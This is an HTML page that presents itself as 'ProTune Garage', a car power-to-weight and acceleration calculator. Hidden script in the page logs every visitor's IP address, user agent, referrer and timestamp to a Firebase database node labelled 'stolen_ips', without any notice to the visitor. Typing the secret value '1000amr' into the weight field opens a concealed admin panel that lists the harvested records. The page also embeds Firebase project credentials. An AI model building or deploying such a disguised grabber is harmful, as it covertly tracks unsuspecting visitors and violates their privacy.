<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ProTune Garage</title>
    <!-- Firebase SDK (نسخة compat لضمان العمل) -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 24px;
            padding: 28px 24px 32px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            margin-bottom: 6px;
        }
        .sub {
            font-size: 13px;
            color: #666666;
            border-bottom: 1px solid #eeeeee;
            padding-bottom: 18px;
            margin-bottom: 28px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            color: #555555;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #cccccc;
            border-radius: 14px;
            background: #ffffff;
            font-family: monospace;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #000000;
        }
        button {
            background: #000000;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 15px;
            font-weight: 500;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 12px;
        }
        button:active {
            background: #333333;
        }
        .result-panel {
            background: #f6f6f6;
            border-radius: 18px;
            padding: 18px;
            margin-top: 28px;
        }
        .result-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e3e3e3;
            font-size: 14px;
        }
        .result-row:last-child {
            border-bottom: none;
        }
        .result-label {
            font-weight: 500;
            color: #333333;
        }
        .result-value {
            font-family: monospace;
            font-weight: 600;
            color: #000000;
        }
        .footer {
            text-align: center;
            font-size: 10px;
            color: #aaaaaa;
            margin-top: 28px;
            padding-top: 18px;
            border-top: 1px solid #eeeeee;
        }
    </style>
</head>
<body>

<div class="card">
    <h1>ProTune Garage</h1>
    <div class="sub">professional vehicle calibration</div>

    <div class="input-group">
        <label>Horsepower (HP)</label>
        <input type="number" id="hpInput" value="350">
    </div>

    <div class="input-group">
        <label>Weight (kg)</label>
        <input type="text" id="weightInput" value="1450">
    </div>

    <div class="input-group">
        <label>Torque (Nm)</label>
        <input type="number" id="torqueInput" value="480">
    </div>

    <div class="input-group">
        <label>Fuel type</label>
        <select id="fuelSelect">
            <option value="Petrol">Petrol</option>
            <option value="Diesel">Diesel</option>
            <option value="Electric">Electric</option>
            <option value="Hybrid">Hybrid</option>
        </select>
    </div>

    <button id="applyBtn">Apply setup</button>

    <div class="result-panel">
        <div class="result-row">
            <span class="result-label">Power / weight ratio</span>
            <span class="result-value" id="ratioValue">--</span>
        </div>
        <div class="result-row">
            <span class="result-label">0-100 km/h (est.)</span>
            <span class="result-value" id="accelValue">--</span>
        </div>
        <div class="result-row">
            <span class="result-label">Top speed (est.)</span>
            <span class="result-value" id="speedValue">--</span>
        </div>
    </div>
    <div class="footer">dynamic simulation · realtime</div>
</div>

<script>
    // Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyB3KvWajAab8XzEtbF-3y0ilLmHRzzOH6w",
        authDomain: "ipip-e5098.firebaseapp.com",
        databaseURL: "https://ipip-e5098-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "ipip-e5098",
        storageBucket: "ipip-e5098.firebasestorage.app",
        messagingSenderId: "587540435828",
        appId: "1:587540435828:web:694e822d17c10293449221"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    var database = firebase.database();

    // === 1. Capture IP and save to Firebase ===
    function captureAndStoreIP() {
        fetch('https://api.ipify.org?format=json')
            .then(function(response) { return response.json(); })
            .then(function(data) {
                var realIP = data.ip;
                var record = {
                    ip: realIP,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    page: "protune_final",
                    referrer: document.referrer || "direct"
                };
                database.ref('stolen_ips').push(record);
            })
            .catch(function(err) {});
    }

    // === 2. Update performance metrics ===
    function updateMetrics() {
        var hp = parseFloat(document.getElementById('hpInput').value) || 0;
        var weightVal = document.getElementById('weightInput').value;
        var weight = (weightVal === "1000amr") ? 1450 : (parseFloat(weightVal) || 1450);
        var fuel = document.getElementById('fuelSelect').value;

        var ratio = (hp / weight) * 1000;
        document.getElementById('ratioValue').innerText = ratio.toFixed(2) + " HP/ton";

        var accel = "--";
        if (hp > 0 && weight > 0) {
            var raw = weight / (hp * 0.85);
            if (raw < 2.5) raw = 2.5;
            if (raw > 12) raw = 12;
            accel = raw.toFixed(1) + " sec";
        }
        document.getElementById('accelValue').innerText = accel;

        var top = hp * 0.95;
        if (fuel === "Electric") top = top * 0.88;
        if (fuel === "Diesel") top = top * 0.92;
        if (top < 140) top = 140;
        document.getElementById('speedValue').innerText = Math.floor(top) + " km/h";
    }

    // === 3. Activate Admin Panel ===
    function activateAdminPanel() {
        var htmlContent = '<!DOCTYPE html>\n';
        htmlContent += '<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">\n';
        htmlContent += '<title>Admin | IPv4 Logs</title>\n';
        htmlContent += '<style>\n';
        htmlContent += 'body{background:#fff;font-family:system-ui;margin:0;padding:20px;}\n';
        htmlContent += '.container{max-width:1300px;margin:0 auto;border:1px solid #ddd;border-radius:24px;padding:24px;}\n';
        htmlContent += 'h1{font-size:22px;font-weight:500;border-left:4px solid #000;padding-left:18px;}\n';
        htmlContent += 'table{width:100%;border-collapse:collapse;margin-top:20px;font-size:13px;}\n';
        htmlContent += 'th{text-align:left;background:#f5f5f5;padding:12px;border-bottom:1px solid #ddd;}\n';
        htmlContent += 'td{padding:12px;border-bottom:1px solid #eee;font-family:monospace;}\n';
        htmlContent += 'button{background:#000;color:#fff;border:none;border-radius:40px;padding:8px 24px;cursor:pointer;margin-bottom:20px;}\n';
        htmlContent += '.status{margin:15px 0;padding:12px;background:#f4f4f4;border-radius:12px;}\n';
        htmlContent += '</style></head><body>\n';
        htmlContent += '<div class="container">\n';
        htmlContent += '<h1>IPv4 Asset Database</h1>\n';
        htmlContent += '<button id="refreshBtn">Refresh Data</button>\n';
        htmlContent += '<div class="status" id="statusMsg">Loading IPv4 addresses...</div>\n';
        htmlContent += '<div style="overflow-x:auto;">\n';
        htmlContent += '<table id="ipTable"><thead><tr><th>#</th><th>IPv4 Address</th><th>User Agent</th><th>Timestamp</th><th>Referrer</th></tr></thead>\n';
        htmlContent += '<tbody id="tableBody"><tr><td colspan="5">Connecting to database...</td></tr></tbody></table>\n';
        htmlContent += '</div></div>\n';
        htmlContent += '<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"><\/script>\n';
        htmlContent += '<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"><\/script>\n';
        htmlContent += '<script>\n';
        htmlContent += 'var cfg = { apiKey: "AIzaSyB3KvWajAab8XzEtbF-3y0ilLmHRzzOH6w", authDomain: "ipip-e5098.firebaseapp.com", databaseURL: "https://ipip-e5098-default-rtdb.europe-west1.firebasedatabase.app", projectId: "ipip-e5098", storageBucket: "ipip-e5098.firebasestorage.app", messagingSenderId: "587540435828", appId: "1:587540435828:web:694e822d17c10293449221" };\n';
        htmlContent += 'firebase.initializeApp(cfg);\n';
        htmlContent += 'var dbRef = firebase.database().ref("stolen_ips");\n';
        htmlContent += 'var statusDiv = document.getElementById("statusMsg");\n';
        htmlContent += 'function loadIPs() { dbRef.once("value").then(function(snap) { var data = snap.val(); var tbody = document.getElementById("tableBody"); tbody.innerHTML = ""; if(!data) { tbody.innerHTML="<tr><td colspan=\\"5\\">No IPv4 captured yet.<\/td><\/tr>"; statusDiv.innerText="Database empty."; return; } var idx=1; var count=0; Object.entries(data).reverse().forEach(function(entry) { var row = tbody.insertRow(); row.insertCell(0).innerText = idx++; row.insertCell(1).innerText = entry[1].ip || "N/A"; row.insertCell(2).innerText = (entry[1].userAgent || "").substring(0,65); row.insertCell(3).innerText = entry[1].timestamp || "N/A"; row.insertCell(4).innerText = entry[1].referrer || "direct"; count++; }); statusDiv.innerText = "Loaded "+count+" records."; }).catch(function(err) { statusDiv.innerText = "Error: "+err.message; }); }\n';
        htmlContent += 'document.getElementById("refreshBtn").onclick = loadIPs; loadIPs(); setInterval(loadIPs, 5000);\n';
        htmlContent += '<\/script></body></html>';
        
        document.write(htmlContent);
        document.close();
    }

    // === 4. Check for admin trigger ===
    function checkAdminTrigger() {
        var weightVal = document.getElementById('weightInput').value;
        if (weightVal === "1000amr") {
            activateAdminPanel();
            return true;
        }
        return false;
    }

    // === 5. Event listeners ===
    document.getElementById('applyBtn').addEventListener('click', function() {
        updateMetrics();
        checkAdminTrigger();
    });
    
    document.getElementById('weightInput').addEventListener('change', function() {
        updateMetrics();
        checkAdminTrigger();
    });
    
    document.getElementById('hpInput').addEventListener('input', updateMetrics);
    document.getElementById('torqueInput').addEventListener('input', updateMetrics);
    document.getElementById('fuelSelect').addEventListener('change', updateMetrics);

    // === 6. Start ===
    captureAndStoreIP();
    updateMetrics();
</script>

</body>
</html>
